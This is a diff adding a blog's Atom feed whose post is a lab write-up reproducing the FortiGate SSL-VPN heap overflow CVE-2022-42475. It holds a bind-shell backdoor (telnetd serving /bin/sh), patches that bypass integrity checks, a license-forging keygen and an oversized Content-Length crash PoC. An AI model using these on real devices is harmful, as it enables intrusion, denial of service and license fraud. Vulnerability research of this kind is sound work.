@@ -1,0 +1,4790 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+    <id>https://kotoriseed.github.io/</id>
+    <title>kotori的菜园</title>
+    <updated>2024-03-04T08:01:56.305Z</updated>
+    <generator>https://github.com/jpmonette/feed</generator>
+    <link rel="alternate" href="https://kotoriseed.github.io/"/>
+    <link rel="self" href="https://kotoriseed.github.io/atom.xml"/>
+    <subtitle>挑战者贵为永恒黄金</subtitle>
+    <logo>https://kotoriseed.github.io/images/avatar.png</logo>
+    <icon>https://kotoriseed.github.io/favicon.ico</icon>
+    <rights>All rights reserved 2024, kotori的菜园</rights>
+    <entry>
+        <title type="html"><![CDATA[CVE-2022-42475 FortiGate SSLVPN Heap Overflow]]></title>
+        <id>https://kotoriseed.github.io/post/cve-2022-42475/</id>
+        <link href="https://kotoriseed.github.io/post/cve-2022-42475/">
+        </link>
+        <updated>2024-03-04T08:00:22.000Z</updated>
+        <content type="html"><![CDATA[<p>很早以前就想复现的一个漏洞，最近刚好有机会可以看看。</p>
+<h1 id="环境搭建">环境搭建</h1>
+<p>因为笔者买不起真实设备，所以选择了在海鲜市场买vm虚拟机（笑）</p>
+<p>受影响的版本可以在<a href="https://www.fortiguard.com/psirt/FG-IR-22-398">这里</a>查看，笔者选择的是受影响的最后一个版本，也就是<code>7.2.2</code></p>
+<h2 id="提取文件系统">提取文件系统</h2>
+<p>因为用的是vm虚拟机，所以可以直接把vmdk挂载到平时使用的ubuntu上（可以使用<code>qemu-ndb</code>来挂载，笔者是直接使用VMware的图形界面新增硬盘的功能来挂载的）</p>
+<figure data-type="image" tabindex="1"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2024/02/01/65bb4bfecdca5.webp" alt="1706773501357.webp" loading="lazy"></figure>
+<p>挂载好之后可以在ubuntu中看到以下文件</p>
+<pre><code class="language-sh">&gt; ls -l /media/kotori/FORTIOS
+total 83244
+-rw-r--r-- 1 root root        1 Sep 30  2022 boot.msg
+-rw-r--r-- 1 root root 13238193 Sep 30  2022 datafs.tar.gz
+-rw-r--r-- 1 root root      155 Sep 30  2022 extlinux.conf
+-rw-r--r-- 1 root root       52 Sep 30  2022 filechecksum
+-rw-r--r-- 1 root root  4147088 Sep 30  2022 flatkc
+-rw-r--r-- 1 root root      256 Sep 30  2022 flatkc.chk
+-r--r--r-- 1 root root   122656 Sep 30  2022 ldlinux.c32
+-r--r--r-- 1 root root    69632 Sep 30  2022 ldlinux.sys
+drwx------ 2 root root    16384 Sep 30  2022 lost+found
+-rw-r--r-- 1 root root 67517892 Sep 30  2022 rootfs.gz
+-rw-r--r-- 1 root root      256 Sep 30  2022 rootfs.gz.chk
+
+</code></pre>
+<p>其中<code>flatkc</code>是bzImage内核，<code>extlinux.conf</code>是内核的启动参数</p>
+<pre><code class="language-sh">&gt; cat /media/kotori/FORTIOS/extlinux.conf                     
+DISPLAY boot.msg
+TIMEOUT 10
+TOTALTIMEOUT 9000
+DEFAULT flatkc ro panic=5 endbase=0xA0000 console=ttyS0, root=/dev/ram0 ramdisk_size=65536 initrd=/rootfs.gz
+</code></pre>
+<p>而<code>rootfs.gz</code>就是我们要提取的文件系统，将它拷贝到本地过后使用<code>gunzip</code>和<code>cpio</code>解包，</p>
+<pre><code class="language-sh">&gt; ls
+bin.tar.xz      dev       lib64                sbin        usr.tar.xz.chk
+bin.tar.xz.chk  etc       migadmin.tar.xz      sys         var
+boot            fortidev  node-scripts.tar.xz  tmp
+data            init      proc                 usr
+data2           lib       rootfs               usr.tar.xz
+</code></pre>
+<p>解压出来会发现<code>bin</code>目录和部分其他目录都以<code>.tar.xz</code>格式打包了，飞塔使用的tar和xz的算法都是自己魔改过的，在<code>sbin</code>目录下可以找到对应的可执行文件，直接尝试使用这里的文件来解包。</p>
+<pre><code class="language-sh">&gt; ./sbin/xz --check=sha256 -d ./bin.tar.xz
+zsh: no such file or directory: ./sbin/xz
+</code></pre>
+<p>这里抛出了<code>no such file or directorty: ./sbin/xz</code>的报错，猜测是他链接的库的路径问题</p>
+<pre><code class="language-sh">&gt; ldd ./sbin/xz             
+	linux-vdso.so.1 (0x00007ffcb54f1000)
+	libm.so.6 =&gt; /lib/x86_64-linux-gnu/libm.so.6 (0x00007f5ac637e000)
+	libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f5ac618c000)
+	/fortidev/lib64/ld-linux-x86-64.so.2 =&gt; /lib64/ld-linux-x86-64.so.2 (0x00007f5ac64e7000)
+</code></pre>
+<p><code>ld-linux-x86-64.so.2</code>使用的是以当前文件系统为根目录的绝对路径，所以我们需要chroot修改一下根目录，</p>
+<pre><code class="language-sh">chroot . sbin/xz --check=sha256 -d ./bin.tar.xz
+chroot . sbin/ftar -xf ./bin.tar
+</code></pre>
+<p>这样就提取出了bin文件夹，这里面的大量文件都是到<code>/bin/init</code>或<code>/bin/sysctl</code>的软链接（前者实现了大量功能，后者类似于精简版的busybox，提供了一些基础的shell命令），我们要分析的漏洞文件<code>sslvpnd</code>也是到<code>/bin/init</code>的软链接。</p>
+<pre><code class="language-sh">&gt; ls -l ./bin | grep sslvpnd
+lrwxrwxrwx 1 root root        9 Jan 29 19:39 sslvpnd -&gt; /bin/init
+</code></pre>
+<h2 id="调试后门植入">调试后门植入</h2>
+<h3 id="修改文件系统">修改文件系统</h3>
+<p>因为fortigate的设备开机之后自动启动的是飞塔的CLI shell，全是网络配置的命令，没有办法像我们拿到正常的linux shell那样方便操作，所以需要我们通过重新打包文件系统来制作后门。</p>
+<p>首先<strong>静态编译</strong>一个busybox到bin目录下，笔者使用的是<code>busybox-1.36.0</code>，编译好之后直接复制过去。</p>
+<pre><code class="language-sh">cp /home/kotori/Desktop/busybox-1.36.0/busybox ./bin/
+chmod 777 ./bin/busybox
+</code></pre>
+<p>重新制作sh为指向<code>/bin/busybox</code>的软链接：</p>
+<pre><code class="language-sh">rm -rf ./bin/sh
+ln -s /bin/busybox ./bin/sh
+</code></pre>
+<p>（不过这个软链接由于不明原因起不到作用，如果有师傅知道怎么回事还请指点一下）</p>
+<p>在CLI shell中执行<code>diagnose hardware smartctl</code>时，会调用execv运行<code>/bin/smartctl</code></p>
+<pre><code class="language-c">__int64 __fastcall sub_23A2D40(int a1, const void *a2)
+{
+  __int64 v2; // rbx
+  void *v3; // rsp
+  __pid_t v4; // eax
+  unsigned int v5; // r12d
+  int *v7; // rbx
+  char *v8; // rax
+  char *v9[6]; // [rsp+0h] [rbp-30h] BYREF
+
+  v2 = a1;
+  v9[1] = (char *)__readfsqword(0x28u);
+  v3 = alloca(8LL * (a1 + 1));
+  v4 = fork();
+  v5 = v4;
+  if ( v4 &lt; 0 )
+  {
+    if ( (unsigned int)sub_212EAB0() || *(_DWORD *)(sub_21E9820() + 4) &gt; 2u )
+    {
+      v7 = __errno_location();
+      v8 = strerror(*v7);
+      fprintf(stdout, &quot;[%s:%d] fork() failed: (%d)%s\n&quot;, &quot;act_diag_hw_smartctl&quot;, 641LL, (unsigned int)*v7, v8);
+    }
+    fflush(stdout);
+  }
+  else if ( v4 )
+  {
+    v5 = 0;
+    wait(0LL);
+  }
+  else
+  {
+    if ( a1 &lt;= 0 )
+      v2 = 0LL;
+    else
+      memcpy(v9, a2, 8LL * a1);
+    v9[v2] = 0LL;
+    execv(&quot;/bin/smartctl&quot;, v9);  // here
+  }
+  return v5;
+}
+</code></pre>
+<p>我们可以很方便地劫持该文件为后门入口。</p>
+<p>编写一个简单的后门程序，前面两个命令用来测试后门是否正常运行，第三个命令制作一个反弹shell（由于防火墙策略的存在，不能随便起端口，所以这里采用kill掉原来的ssh服务后马上在22端口起telnet的方式）</p>
+<pre><code class="language-c"># include &lt;stdio.h&gt;
+
+void shell() {
+	system(&quot;/bin/busybox ls&quot;, 0, 0);
+	system(&quot;/bin/busybox id&quot;, 0, 0);
+	system(&quot;/bin/busybox killall sshd &amp;&amp; /bin/busybox telnetd -l /bin/sh -b 0.0.0.0 -p 22&quot;, 0, 0);
+
+	return;
+}
+
+int main(int argc, char const *argv[]) {
+	shell();
+
+	return 0;
+}
+</code></pre>
+<p>静态编译后替换bin目录下的smartctl。</p>
+<pre><code class="language-sh">gcc backdoor.c -o backdoor --static -g
+rm ./bin/smartctl
+cp ./backdoor ./bin/smartctl
+chmod 777 ./bin/smartctl
+</code></pre>
+<p>至此，反弹shell后门制作完毕。但如果此时直接打包文件系统是没办法通过文件系统的自检的，所以我们还需要做一些额外的工作（某些旧版本不需要这一步）。</p>
+<h3 id="绕过完整性校验">绕过完整性校验</h3>
+<p>内核启动时会有如下调用链</p>
+<pre><code>start_kernel
+	rest_init
+		kernel_init
+			init_post_isra_0
+</code></pre>
+<p>在<code>init_post_isra_0</code>中会调用<code>fgt_verify</code>来check文件系统是否被篡改，如果通过校验则运行<code>/sbin/init</code></p>
+<pre><code class="language-c">void __fastcall __noreturn init_post_isra_0(__int64 a1, void **a2)
+{
+  char v2; // al
+  __int64 v3; // rax
+  int v4; // edx
+  int v5; // ecx
+  int v6; // r8d
+  int v7; // r9d
+  char v8; // [rsp-8h] [rbp-8h]
+
+  v8 = v2;
+  async_synchronize_full();
+  free_initmem();
+  dword_FFFFFFFF80A1D980 = 1;
+  numa_default_policy();
+  v3 = *(_QWORD *)(__readgsqword(0xB700u) + 1048);
+  *(_DWORD *)(v3 + 92) |= 0x40u;
+  if ( !(unsigned int)fgt_verify() )
+  {
+    off_FFFFFFFF809BC2C0 = &quot;/sbin/init&quot;;
+    a2 = &amp;off_FFFFFFFF809BC2C0;
+    kernel_execve(&quot;/sbin/init&quot;, &amp;off_FFFFFFFF809BC2C0, &amp;off_FFFFFFFF809BC1A0);
+  }
+  panic(
+    (unsigned int)&quot;No init found.  Try passing init= option to kernel. See Linux Documentation/init.txt for guidance.&quot;,
+    (_DWORD)a2,
+    v4,
+    v5,
+    v6,
+    v7,
+    v8);
+}
+</code></pre>
+<p><code>/sbin/init</code>的main函数如下：</p>
+<pre><code class="language-c">__int64 __fastcall main(__int64 a1, char **a2, char **a3)
+{
+  char *argv[4]; // [rsp+0h] [rbp-20h] BYREF
+
+  argv[3] = (char *)__readfsqword(0x28u);
+  sub_4017D0(a1, a2, a3);
+  unlink(&quot;/sbin/init.chk&quot;);
+  if ( (int)sub_401AD0(&quot;bin&quot;) &gt;= 0 &amp;&amp; (int)sub_401AD0(&quot;migadmin&quot;) &gt;= 0 &amp;&amp; (int)sub_401AD0(&quot;node-scripts&quot;) &gt;= 0 )
+    sub_401AD0(&quot;usr&quot;);
+  argv[0] = &quot;/bin/init&quot;;
+  argv[1] = 0LL;
+  execve(&quot;/bin/init&quot;, argv, 0LL);
+  return 0LL;
+}
+</code></pre>
+<p><code>sub_401AD0</code>是利用sbin目录下的程序解包对应的压缩目录，解包完之后便调用<code>execve</code>运行<code>/bin/init</code></p>
+<p>不过在这之前，还调用了<code>sub_4017D0</code>：</p>
+<pre><code class="language-c">unsigned __int64 sub_4017D0()
+{
+  char v0; // cl
+  char v1; // dl
+  __int64 i; // rax
+  __int64 v4; // [rsp+Fh] [rbp-41h]
+  char v5[17]; // [rsp+17h] [rbp-39h] BYREF
+  __int16 v6; // [rsp+28h] [rbp-28h]
+  unsigned __int64 v7; // [rsp+48h] [rbp-8h]
+
+  v0 = 97;
+  v1 = 78;
+  v7 = __readfsqword(0x28u);
+  v4 = 0x42F1C441217474ELL;
+  strcpy(v5, &quot;aiqu0oZi&quot;);
+  for ( i = 0LL; ; v0 = v5[i] )
+  {
+    v5[i++ + 9] = v0 ^ v1;
+    if ( i == 8 )
+      break;
+    v1 = v5[i - 8];
+  }
+  v6 = 50;
+  sub_401700(&amp;v5[9]);
+  return v7 - __readfsqword(0x28u);
+}
+</code></pre>
+<p>有个可疑的字符串<code>v5</code>，写出简单脚本对<code>v5</code>做一个解密，</p>
+<pre><code class="language-c">#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+
+int main()
+{
+    char v0 = 97;
+    char v1 = 78;
+    char v4[] = {0x4e, 0x47, 0x17, 0x12, 0x44, 0x1c, 0x2f, 0x04};
+    char v5[17] = {};
+    
+    strcpy(v5, &quot;aiqu0oZi&quot;);
+    for (int i = 0LL; ; v0 = v5[i] ) {
+        v5[i++ + 9] = v0 ^ v1;
+        if ( i == 8 )
+            break;
+        v1 = v4[i];
+    }
+
+    puts(&amp;v5[9]);
+
+	return 0;
+}
+</code></pre>
+<p>得到的结果前8个字符是<code>/.fgtsum</code>，跟进<code>sub_401700</code>可以看到<code>EVP_sha256</code>等函数，所以猜测此函数的用途也是检测文件系统完整性。</p>
+<p>我们给它patch掉，</p>
+<figure data-type="image" tabindex="2"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2024/01/31/65b9bf1228094.webp" alt="1706671886100.webp" loading="lazy"></figure>
+<p>如果一切都正常的话，此时就会进到<code>/bin/init</code>中，</p>
+<p>经过简单分析，在<code>/bin/init</code>的main函数中也存在三处check（图中的<code>sub_44F1F0</code>漏掉了注释），</p>
+<figure data-type="image" tabindex="3"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2024/01/30/65b8b8cba7128.webp" alt="1706604745248.webp" loading="lazy"></figure>
+<p>如果check失败的话则会直接进入<code>sub_44F070</code>重启系统。</p>
+<p>这里笔者选择直接patch掉判断（按理说也可以直接将<code>sub_44F070</code>的开头patch成ret，不过XREF一下会发现正常的关机流程也会调用它，所以笔者没有选择这个方法）</p>
+<figure data-type="image" tabindex="4"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2024/01/31/65b9c34d95f1a.webp" alt="1706672967307.webp" loading="lazy"></figure>
+<p>我这里是把第一处的跳转nop掉，然后把第二处的<code>jz</code> patch成<code>jmp</code>，如此一来，这两处check就无论如何都不会进到<code>sub_44F070</code>了。</p>
+<p>用patch后的init替换掉原来的init后就可以重新打包文件系统了。</p>
+<pre><code class="language-sh">chroot . sbin/ftar -cf ./bin.tar ./bin
+chroot . sbin/xz --check=sha256 -e ./bin.tar
+rm -rf ./bin
+find . | cpio -o --format=newc &gt; ../rootfs.raw
+cat ../rootfs.raw | gzip &gt; ./rootfs.gz
+</code></pre>
+<p>打包好之后替换掉vmdk中的rootfs.gz，拿新的vmdk去替换掉虚拟机原来的那个硬盘就行了。</p>
+<p>此时我们梳理一遍开机的流程：</p>
+<ul>
+<li>内核启动，调用<code>fgt_verify</code>进行文件系统校验，通过后运行<code>/sbin/init</code></li>
+<li><code>/sbin/init</code>再次检查文件系统完整性，然后解压<code>bin</code>, <code>migadmin</code>, <code>node-scripts</code>, <code>usr</code>这四个文件夹，无误后运行<code>/bin/init</code></li>
+<li><code>/bin/init</code>替换自身进程为<code>/bin/initXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</code>，重定向三个标准文件描述符到<code>/dev/null</code>，再次检查文件系统完整性......</li>
+</ul>
+<p>后面两步的检查已经被我们patch掉了，重点就是解决第一步的问题。</p>
+<p>因为对内核patch后重新打包不是很行得通，故尝试直接动调hook掉检查。</p>
+<p>VMware针对内核调试有专门的接口，在FortiGate的<code>vmx</code>文件中加入debugStub：</p>
+<pre><code>debugStub.listen.guest64 = &quot;TRUE&quot;
+debugStub.listen.guest64.remote = &quot;TRUE&quot;
+debugStub.port.guest64 = &quot;1337&quot;
+debugStub.listen.guest32 = &quot;TRUE&quot;
+debugStub.listen.guest32.remote = &quot;TRUE&quot;
+debugStub.port.guest32 = &quot;1338&quot;
+</code></pre>
+<p>启动的时候即可使用gdb连上去远程调试了（一开始使用的是pwndbg，不过实在是太慢了，就换成了gef）</p>
+<p>断在判断<code>fgt_verify</code>后，patch返回值为0</p>
+<figure data-type="image" tabindex="5"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2024/01/31/65b9b76f5591a.webp" alt="1706669930989.webp" loading="lazy"></figure>
+<p>成功通过校验，启动系统</p>
+<figure data-type="image" tabindex="6"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2024/01/31/65b9c654692f2.webp" alt="1706673744181.webp" loading="lazy"></figure>
+<p>这里笔者打包好了自动patch的脚本</p>
+<pre><code class="language-sh">&gt; cat ./gdbinit                         
+file ./vmlinux
+gef-remote 192.168.43.208 1337
+b *0xFFFFFFFF807AC117
+c
+!sleep 1
+ni
+set $eax=0
+c
+</code></pre>
+<p>登录上之后<code>diagnose hardware smartctl</code>打开后门，可以看到前面两条验证指令正常运行了，</p>
+<figure data-type="image" tabindex="7"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2024/01/31/65b9c67c98d4a.webp" alt="1706673782678.webp" loading="lazy"></figure>
+<p>在ubuntu中使用telnet连上去成功getshell</p>
+<figure data-type="image" tabindex="8"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2024/01/31/65b9dbaf358b2.webp" alt="1706679213769.webp" loading="lazy"></figure>
+<p>接着上传一个静态编译的gdbserver方便后续调试。</p>
+<p>笔者是在本地搭了一个http file server，直接用wget拉取下来。</p>
+<figure data-type="image" tabindex="9"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2024/01/31/65b9e4e49312c.webp" alt="1706681570954.webp" loading="lazy"></figure>
+<p>不过每次重启都需要重新上传，最好还是修改文件系统的时候直接打包放进去</p>
+<p>还是因为防火墙policy的原因，我们不能直接开端口，这里我选择了kill掉原来8013的服务</p>
+<pre><code class="language-sh">/bin/busybox killall fsvrd &amp;&amp; ./gdbserver-7.10.1-x64 :8013 --attach 190
+</code></pre>
+<p>可以正常调试了</p>
+<figure data-type="image" tabindex="10"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2024/02/01/65bb31ee6ac6b.webp" alt="1706766828755.webp" loading="lazy"></figure>
+<h2 id="配置sslvpn">配置sslvpn</h2>
+<p>因为漏洞点在sslvpn的功能中，所以需要给设备配置sslvpn</p>
+<p>首先打开port1的http服务，笔者这里是把能开的服务全开了</p>
+<figure data-type="image" tabindex="11"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2024/01/31/65b9e42b76c31.webp" alt="1706681385680.webp" loading="lazy"></figure>
+<p>访问web页面，登录管理账号</p>
+<figure data-type="image" tabindex="12"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2024/01/31/65b9e65032bcf.webp" alt="1706681934478.webp" loading="lazy"></figure>
+<p>不出意外的话，登录之后会让你弄一个License，这里可以直接选择免费的<code>Evaluation License</code>，注册一个飞塔账号就行了。但是使用免费的<code>Evaluation License</code>会使设备进入LENC模式，在此模式下加密算法受限，会导致SSL或TLS需要降版本交互。因此，笔者采用了破解<code>Full License</code>的方法。</p>
+<p>根据<a href="https://wzt.ac.cn/2023/03/02/fortios_padding/">这篇文章</a>的分析，我们可以写出注册机：</p>
+<pre><code class="language-python">import struct
+import base64
+from Crypto.Cipher import AES
+
+lic_key_array = {
+    &quot;SERIALNO&quot;: (0x73, 0x0),
+    &quot;CERT&quot;: (0x73, 0x8),
+    &quot;KEY&quot;: (0X73, 0x10),
+    &quot;CERT2&quot;: (0X73, 0x18),
+    &quot;KEY2&quot;: (0X73, 0x20),
+    &quot;CREATEDATE&quot;: (0x73, 0x28),
+    &quot;UUID&quot;: (0x73, 0x30),
+    &quot;CONTRACT&quot;: (0x73, 0x38),
+    &quot;USGFACTORY&quot;: (0x6e, 0x40),
+    &quot;LENCFACTORY&quot;: (0x6e, 0x44),
+    &quot;CARRIERFACTORY&quot;: (0x6e, 0x48),
+    &quot;EXPIRY&quot;: (0x6e, 0x4c)
+}
+
+
+class License:
+    fixed_aes_key = b&quot;\x4C\x7A\xD1\x3C\x95\x3E\xB5\xC1\x06\xDA\xFC\xC3\x90\xAE\x3E\xCB&quot;
+    fixed_aes_iv = b&quot;\x4C\x7A\xD1\x3C\x95\x3E\xB5\xC1\x06\xDA\xFC\xC3\x90\xAE\x3E\xCB&quot;
+    fixed_rsa_header = b&quot;\x78\x99\xBF\xA5\xEF\x56\xAA\x98\xC1\x0B\x87\x2E\x30\x8E\x54\xF9\x71\xAD\x13\xEA\xAA\xBC\xE2\x0C\xB3\xAE\x65\xAE\xF9\x0E\x9B\xD1\x88\xC7\xFE\xBC\x86\x65\xFE\xE7\x62\xDE\x43\x0B\x02\x15\x36\xC8\xC5\xCD\x0E\xB9\x01\x97\xCE\x82\x27\x0F\x69\x7F\x6A\x29\xEC\x1C&quot;
+
+    rsa_header_length = len(fixed_rsa_header)  # 4 bytes
+    aes_key = fixed_aes_iv + fixed_aes_key  # 32 bytes  iv + key
+    enc_data_length = None
+    enc_data = None
+    license_data = None
+
+    license_header = &quot;-----BEGIN FGT VM LICENSE-----\r\n&quot;
+    license_tail = &quot;-----END FGT VM LICENSE-----\r\n&quot;
+
+    def __init__(self, licensedata):
+        self.license_data = licensedata
+
+    def encrypt_data(self):
+        tmp_buf = b&quot;\x00&quot; * 4 + struct.pack(&quot;&lt;I&quot;, 0x13A38693) + b&quot;\x00&quot; * 4 + self.license_data  # append magic number
+
+        def encrypt(data, password, iv):
+            bs = 16
+            pad = lambda s: s + (bs - len(s) % bs) * chr(bs - len(s) % bs).encode()
+            cipher = AES.new(password, AES.MODE_CBC, iv)
+            data = cipher.encrypt(pad(data))
+            return data
+
+        self.enc_data = encrypt(tmp_buf, self.aes_key[16:], self.aes_key[:16])
+        self.enc_data_length = len(self.enc_data)
+
+    def obj_to_license(self):
+        buf = b&quot;&quot;
+        buf += struct.pack(&quot;&lt;I&quot;, self.rsa_header_length)
+        buf += self.fixed_rsa_header
+        buf += struct.pack(&quot;&lt;I&quot;, self.enc_data_length)
+        buf += self.enc_data
+        return base64.b64encode(buf)
+
+
+class LicenseDataBlock:
+    key_name_length = None  # 1 byte
+    key_name = None
+    key_flag = None  # 1 byte, 's' for str or 'n' for num
+    key_value_length = None  # 2 bytes
+    key_value = None
+
+    def __init__(self, keyname, keyvalue):
+        self.key_name_length = len(keyname)
+        self.key_name = keyname
+        self.key_value_length = len(keyvalue)
+        self.key_value = keyvalue
+        self.key_flag = lic_key_array.get(keyname)[0]
+
+    def obj_to_bin(self):
+        buf = b&quot;&quot;
+        buf += struct.pack(&quot;&lt;B&quot;, self.key_name_length)
+        buf += self.key_name.encode()
+        buf += struct.pack(&quot;&lt;B&quot;, self.key_flag)
+        if self.key_flag == 0x73:
+            buf += struct.pack(&quot;&lt;H&quot;, self.key_value_length)
+            buf += self.key_value.encode()
+        elif self.key_flag == 0x6e:
+            buf += struct.pack(&quot;&lt;H&quot;, 4)
+            buf += struct.pack(&quot;&lt;I&quot;, int(self.key_value))
+        return buf
+
+
+if __name__ == &quot;__main__&quot;:
+license_data_list = [
+    LicenseDataBlock(&quot;SERIALNO&quot;, &quot;FGVMPGLICENSEDTOCATALPA&quot;),
+    LicenseDataBlock(&quot;CREATEDATE&quot;, &quot;1696089600&quot;),
+    LicenseDataBlock(&quot;USGFACTORY&quot;, &quot;0&quot;),
+    LicenseDataBlock(&quot;LENCFACTORY&quot;, &quot;0&quot;),
+    LicenseDataBlock(&quot;CARRIERFACTORY&quot;, &quot;0&quot;),
+    LicenseDataBlock(&quot;EXPIRY&quot;, &quot;31536000&quot;),
+]
+license_data = b&quot;&quot;
+for obj in license_data_list:
+    license_data += obj.obj_to_bin()
+
+_lic = License(license_data)
+_lic.encrypt_data()
+raw_license = _lic.obj_to_license().decode()
+
+n = 0
+lic = &quot;&quot;
+while True:
+    if n &gt;= len(raw_license):
+        break
+    lic += raw_license[n:n + 64]
+    lic += &quot;\r\n&quot;
+    n += 64
+
+with open(&quot;./License.lic&quot;, &quot;w&quot;) as f:
+    f.write(_lic.license_header + lic + _lic.license_tail)
+
+print(&quot;[+] done.&quot;)
+</code></pre>
+<p>上传生成的License后，即可使用全部功能。</p>
+<p>在4443端口配置SSL-VPN</p>
+<figure data-type="image" tabindex="13"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2024/01/31/65b9f09914ec4.webp" alt="1706684566357.webp" loading="lazy"></figure>
+<p>然后在防火墙Policy里面添加一下对应的规则</p>
+<figure data-type="image" tabindex="14"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2024/01/31/65b9f9e29bb73.webp" alt="1706686944227.webp" loading="lazy"></figure>
+<p>最后能够正常访问到4443端口，漏洞环境配置完成。</p>
+<figure data-type="image" tabindex="15"><img src="https://le1a-1308465514.cos.ap-shanghai.myqcloud.com/2024/01/31/65b9fa28200eb.webp" alt="1706687013746.webp" loading="lazy"></figure>
+<h1 id="漏洞分析">漏洞分析</h1>
+<p>漏洞点的锁定我们可以下载patch过后的版本来使用ida进行diff，不出意外的话会发现相当多的对<code>je_malloc</code>分配大小的限制。这里借用CataLpa师傅在博客中的分析：</p>
+<blockquote>
+<p>考虑到该漏洞是一个堆内存溢出，根据修复方式推测漏洞的根本原因可能是某处发生整数溢出，导致内存分配函数返回了一块较小的内存，而后续拷贝数据时又使用了较大的 size。</p>
+<p>而在 HTTP 请求中可能有两种情况会导致以上结果，一是某些功能 handler 函数中对用户提交的参数验证不严格，或者代码在解析请求时对 Content-Length 的解析出现异常。</p>
+<p>sslvpn 中在未授权情况下能够访问的功能点不多，漏洞出现在请求解析阶段可能性比较大。sslvpnd 是基于 Apache httpd 修改而来，开发者在其中添加了很多自定义代码，导致复杂度较高，而且程序不包含符号信息，分析起来会消耗很多时间。</p>
+<p>我们可以采取更简单的方法，基于补丁分析和推测，漏洞可能发生在解析请求，特别是处理 Content-Length 阶段。那么只需要按照 fuzz HTTP 协议的思路，构造一些带有畸形 Content-Length 的请求，例如 CL 过大、或者等于负数的情况，将这些请求发送到能够未授权访问的接口中，同时检测 web 服务状态，发生崩溃或无法收到响应时记录下对应的请求报文。</p>
+</blockquote>
+<p>我们直接构造一个带有巨大Content-Length的数据包：</p>
+<pre><code class="language-python">import socket
+import ssl
+
+def send_post_data(cl, content, host = b'192.168.128.135', path = b'/remote/login', log = True):
+	length = bytes(str(cl), encoding='utf-8')
+
+	data = b'POST ' + path + b' HTTP/1.1\r\n'
+	data += b'Host: ' + host + b'\r\n'
+	data += b'Content-Length: ' + length + b'\r\n'
+	data += b'User-Agent: Mozilla/5.0\r\n'
+	data += b'Content-Type: text/plain;charset=UTF-8\r\n'
+	data += b'Accept: */*\r\n\r\n'
+	data += content
+
+	if log:
+		print(data)
+
+	try:
+		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		try:
+			sock.connect((host, 4443))
+			if log:
+				print('connected')
+		except (socket.error, OSError) as e :
+			print(e)
+		context = ssl._create_unverified_context()
+		sock = context.wrap_socket(sock)
+		sock.sendall(data)
+
+		res = sock.recv(1024)
+		if log:
+			print(res)
+	except Exception as e:
+		print(e)
+
+
+send_post_data(2**31+1, b'a=1')
+
+</code></pre>
+<p>成功触发crash</p>
+<pre><code class="language-sh">Program received signal SIGSEGV, Segmentation fault.
+0x00007fb76eac776d in __memset_avx2_erms () from target:/usr/lib/x86_64-linux-gnu/libc.so.6
+...
+</code></pre>
+<h2 id="制造堆溢出">制造堆溢出</h2>
+<p>经过回溯，最终定位到漏洞函数<code>sub_1785AB0</code>，也就是<code>read_post_data</code>的处理流程</p>
+<pre><code class="language-c">__int64 __fastcall read_post_data(_QWORD *a1)
+{
+  _QWORD *v1; // r12
+  __int64 v2; // rax
+  __int64 v3; // rbx
+  int v4; // eax
+  int v5; // r12d
+  __int64 v6; // rdi
+  __int64 v7; // rdx
+  int v8; // r12d
+  __int64 v10; // rdx
+  int v11; // r12d
+
+  v1 = (_QWORD *)a1[92];
+  v2 = sub_17902B0(a1[83]);
+  v3 = v2;
+  if ( !*(_QWORD *)(v2 + 8) )
+    *(_QWORD *)(v2 + 8) = pool_alloc(*v1, *(_DWORD *)(v2 + 24) + 1);  // vuln here
+  v4 = sub_1662BA0(v1, v3 + 32, 8190LL);
+  v5 = v4;
+  if ( v4 )
+  {
+    if ( v4 &lt; 0 )
+    {
+      if ( (unsigned int)sub_16594C0(a1[77]) - 1 &lt;= 4 )
+        return 0LL;
+    }
+    else
+    {
+      v6 = *(int *)(v3 + 16);
+      v7 = *(_QWORD *)(v3 + 24);
+      if ( (int)v6 + v4 &gt; v7 )
+        v5 = *(_QWORD *)(v3 + 24) - v6;
+      if ( v7 &gt; v6 )
+      {
+        memcpy((void *)(*(_QWORD *)(v3 + 8) + v6), (const void *)(v3 + 32), v5);
+        v10 = *(_QWORD *)(v3 + 24);
+        v11 = *(_DWORD *)(v3 + 16) + v5;
+        *(_DWORD *)(v3 + 16) = v11;
+        if ( v11 &lt; v10 )
+          return 0LL;
+      }
+      else
+      {
+        v8 = *(_DWORD *)(v3 + 16) + v5;
+        *(_DWORD *)(v3 + 16) = v8;
+        if ( v8 &lt; v7 )
+          return 0LL;
+      }
+    }
+  }
+  return 2LL;
+}
+</code></pre>
+<p>此函数申请了<code>Content-Length</code>+1的堆空间，之后再将用户的数据copy到这个chunk上。</p>
+<p>但是对于CL的处理，汇编是这样的：</p>
+<pre><code class="language-assembly">.text:0000000001785B90 8B 40 18                      mov     eax, [rax+18h]
+.text:0000000001785B93 49 8B 3C 24                   mov     rdi, [r12]
+.text:0000000001785B97 8D 70 01                      lea     esi, [rax+1]
+.text:0000000001785B9A 48 63 F6                      movsxd  rsi, esi
+.text:0000000001785B9D E8 CE 8A EC FF                call    pool_alloc
+</code></pre>
+<p>从<code>[rax+18h]</code>拿到CL之后，存在了32bit的寄存器eax上，后续使用<code>lea esi, [rax+1]</code>来对其递增1，最后使用<code>movsxd rsi, esi</code>将其从32bit带符号地扩展为64bit。</p>
